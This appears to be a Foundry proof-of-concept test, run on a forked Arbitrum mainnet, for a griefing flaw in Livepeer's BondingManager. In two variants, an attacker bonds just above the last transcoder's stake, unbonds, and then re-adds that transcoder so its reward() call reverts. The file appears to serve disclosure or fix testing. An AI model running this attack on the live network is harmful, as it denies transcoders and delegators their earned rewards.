// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import { GovernorBaseTest } from "./base/GovernorBaseTest.sol";
import "forge-std/console.sol";

import "contracts/token/LivepeerToken.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function approve(address to, uint256 amount) external returns (bool);

    function balanceOf(address to) external returns (uint256);
}

interface IBondingManager {
    struct TranscoderData {
        uint256 lastRewardRound;
        uint256 rewardCut;
        uint256 feeShare;
        uint256 lastActiveStakeUpdateRound;
        uint256 activationRound;
        uint256 deactivationRound;
        uint256 activeCumulativeRewards;
        uint256 cumulativeRewards;
        uint256 cumulativeFees;
        uint256 lastFeeRound;
    }

    struct TranscoderEarningsPoolData {
        uint256 totalStake;
        uint256 transcoderRewardCut;
        uint256 transcoderFeeShare;
        uint256 cumulativeRewardFactor;
        uint256 cumulativeFeeFactor;
    }

    struct DelegatorData {
        uint256 bondedAmount;
        uint256 fees;
        address delegateAddress;
        uint256 delegatedAmount;
        uint256 startRound;
        uint256 lastClaimRound;
        uint256 nextUnbondingLockId;
    }

    function reward() external;

    function bond(uint256 _amount, address _to) external;

    function unbond(uint256 _amount) external;

    function rebond(uint256 _unbondingLockId) external;

    function transcoder(uint256 _rewardCut, uint256 _feeShare) external;

    function claimEarnings(uint256 _endRound) external;

    function getFirstTranscoderInPool() external view returns (address);

    function getNextTranscoderInPool(address _transcoder) external view returns (address);

    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round)
        external
        view
        returns (TranscoderEarningsPoolData memory);

    function getTranscoder(address _transcoder) external view returns (TranscoderData memory);

    function getDelegator(address _delegator) external view returns (DelegatorData memory);

    function transcoderTotalStake(address _transcoder) external view returns (uint256);
}

interface IRoundsManager {
    function roundLength() external returns (uint256);

    function currentRound() external view returns (uint256);

    function initializeRound() external;
}

// forge test --match-contract BondingManagerGriefLastTranscoderRewardPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv
contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
    LivepeerToken public immutable lpt;
    address public immutable minter;
    IBondingManager public immutable bondingManager;
    IRoundsManager public immutable roundsManager;
    uint256 public lastTranscoderTotalStake;

    constructor() {
        lpt = LivepeerToken(getContract("LivepeerToken"));
        minter = getContract("Minter");
        bondingManager = IBondingManager(getContract("BondingManager"));
        roundsManager = IRoundsManager(getContract("RoundsManager"));
    }

    uint256 roundLength;

    function setUp() public {
        vm.rollFork(430253488); // Feb 9, 2026 https://arbiscan.io/block/430253488
        roundLength = roundsManager.roundLength();
        address lastTranscoder = _getLastTranscoder();
        lastTranscoderTotalStake = bondingManager.transcoderTotalStake(lastTranscoder);
    }

    function _skipToNextRound() internal {
        vm.roll(block.number + roundLength);
        roundsManager.initializeRound();

        console.log("\n---------------------- ROUND = %s ----------------------", roundsManager.currentRound());
    }

    function _getDelegatorData(address del) internal view returns (IBondingManager.DelegatorData memory) {
        return bondingManager.getDelegator(del);
    }

    function _getTransoderEarningPoolData(address del, uint256 round)
        internal
        view
        returns (IBondingManager.TranscoderEarningsPoolData memory)
    {
        return bondingManager.getTranscoderEarningsPoolForRound(del, round);
    }

    function _getTranscoderData(address del) internal view returns (IBondingManager.TranscoderData memory) {
        return bondingManager.getTranscoder(del);
    }

    function _getLastTranscoder() internal view returns (address lastTranscoder) {
        lastTranscoder = bondingManager.getFirstTranscoderInPool();
        for (uint256 i = 1; i < 100; ++i) {
            lastTranscoder = bondingManager.getNextTranscoderInPool(lastTranscoder);
        }
    }

    function testPoc() public {
        address attacker = newAddr();
        address lastTranscoder = _getLastTranscoder();

        // Attacker needs lastTranscoderTotalStake + 2 lpt to execute the attack
        vm.prank(minter);
        lpt.mint(attacker, lastTranscoderTotalStake + 2);

        // ---------------------- ROUND ONE ----------------------
        _skipToNextRound();

        // Attacker bonds for themself to make their status in the next round become "Bonded"
        vm.startPrank(attacker);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(1, attacker);
        vm.stopPrank();

        // ---------------------- ROUND TWO ----------------------
        _skipToNextRound();

        // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
        vm.startPrank(attacker);
        bondingManager.bond(lastTranscoderTotalStake, attacker);
        assertEq(attacker, _getLastTranscoder());

        // Attacker unbonds all to make the `transcoderPool` not full
        bondingManager.unbond(_getDelegatorData(attacker).bondedAmount);

        // The `lastTranscoder` is added into the `transcoderPool` again and becomes deactivated
        bondingManager.bond(1, lastTranscoder);
        vm.stopPrank();

        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);

        // The `lastTranscoder` is unable to claim the reward for ROUND TWO because it is considered as inactive
        vm.expectRevert(bytes("caller must be an active transcoder"));
        vm.prank(lastTranscoder);
        bondingManager.reward();
        console.log(_getTranscoderData(lastTranscoder).deactivationRound);
    }

    function testPocRebond() public {
        // Attacker needs two accounts for the attack
        address attacker = newAddr();
        address attackerForRebond = newAddr();
        address lastTranscoder = _getLastTranscoder();

        // Attacker needs lastTranscoderTotalStake + 5 lpt to execute the attack
        vm.startPrank(minter);
        lpt.mint(attacker, lastTranscoderTotalStake + 3);
        lpt.mint(attackerForRebond, 2);
        vm.stopPrank();

        // ---------------------- ROUND ONE ----------------------
        _skipToNextRound();

        // Attacker bonds to the last transcoder and immediately unbonds
        vm.startPrank(attackerForRebond);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(2, lastTranscoder);
        vm.stopPrank();

        // Attacker bonds for themself to make their status in the next round become "Bonded"
        vm.startPrank(attacker);
        lpt.approve(address(bondingManager), type(uint256).max);
        bondingManager.bond(1, attacker);
        vm.stopPrank();

        // ---------------------- ROUND TWO ----------------------
        _skipToNextRound();

        // Attacker bonds more than the last transcoder and kicks them out of the `transcoderPool`
        vm.startPrank(attacker);
        bondingManager.bond(lastTranscoderTotalStake + 2, attacker);
        assertEq(attacker, _getLastTranscoder());

        // Attacker unbonds all to make the `transcoderPool` not full
        bondingManager.unbond(_getDelegatorData(attacker).bondedAmount);
        vm.stopPrank();

        // Attacker unbonds and rebonds the last transcoder,
        // the `lastTranscoder` is added into the `transcoderPool` again and becomes deactivated
        uint256 unbondingLockId = _getDelegatorData(attackerForRebond).nextUnbondingLockId;
        vm.startPrank(attackerForRebond);
        bondingManager.unbond(1);
        bondingManager.rebond(unbondingLockId);
        vm.stopPrank();

        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);

        // The `lastTranscoder` is unable to claim the reward for ROUND TWO because it is considered as inactive
        vm.expectRevert(bytes("caller must be an active transcoder"));
        vm.prank(lastTranscoder);
        bondingManager.reward();
        console.log(_getTranscoderData(lastTranscoder).deactivationRound);
    }
}
